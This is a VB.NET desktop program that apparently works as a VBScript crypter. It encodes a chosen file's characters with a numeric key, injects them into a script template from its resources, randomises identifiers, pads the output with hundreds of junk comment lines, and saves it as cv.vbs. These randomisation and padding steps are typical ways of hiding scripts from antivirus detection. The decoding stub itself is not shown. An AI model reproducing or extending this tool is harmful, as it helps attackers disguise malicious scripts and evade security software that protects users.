﻿Imports System.Text, System.IO, System.Threading
Public Class Form1

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Try
            Label5.Text = "notification"
            Dim op As New OpenFileDialog
            If op.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim _red As String = IO.File.ReadAllText(op.FileName)
                Dim enc As String = AC(_red, r2.Text)
                Dim Finly As String = My.Resources.TextFile1

                Dim F1 As String = Finly.Replace("%v1%", gens(22)).Replace("%v2%", gens(33)) _
                .Replace("%v3%", gens(44)).Replace("%txt%", enc).Replace("%!%", r1.Text).Replace("%key%", r2.Text) _
                .Replace("%app6%", appnd(A1.Text)).Replace("%app0%", appnd(A2.Text)).Replace("%app1%", appnd(A3.Text)) _
                .Replace("%app2%", appnd(A4.Text)).Replace("%app3%", appnd(A5.Text)).Replace("%app4%", appnd(A6.Text)) _
                .Replace("%app5%", appnd(A7.Text))
                File.WriteAllText(Application.StartupPath & "\cv.vbs", F1)
                Label5.Text = "Encryption successfully completed"
                Label5.ForeColor = Color.DimGray

                If File.Exists(Application.StartupPath & "\cv.vbs") Then
                    Beep()
                    Label6.Text = Application.StartupPath & "\cv.vbs"
                End If


            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)

        End Try
    End Sub

    Public Function appnd(ByVal S As String) As String
        Try
            Dim but As New System.Text.StringBuilder
            Dim int As Integer = 0
            Do While int < 100
                but.Append("'" & gens(S) & vbNewLine)
                int += 1
            Loop
            Return but.ToString
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Function

    Public Function gens(ByVal int As Integer) As String
        Dim num2 As Integer
        Dim str2 As String = "AZERuvwxyzTYUIOPefghijklmQSDFGHJKLMWXCVBNabcdnopqrst"
        Dim random As New Random
        Dim builder As New StringBuilder
        Dim num As Integer = 1
        Do
            Dim startIndex As Integer = random.Next(0, &H23)
            builder.Append(str2.Substring(startIndex, 1))
            num += 1
            num2 = int
        Loop While (num <= num2)
        Return builder.ToString
    End Function

    Public Function AC(ByVal S As String, ByVal KEY As String)
        Try
            Dim BUT As New System.Text.StringBuilder
            For Each XX In S
                BUT.Append(AscW(XX) + KEY & r1.Text)

            Next

            Return BUT.ToString.Remove(BUT.Length - 1)
        Catch ex As Exception
            MessageBox.Show(ex.Message)

        End Try

    End Function


  

    Private Sub HuraButton1_Click(sender As Object, e As EventArgs) Handles HuraButton1.Click
        End
    End Sub
End Class
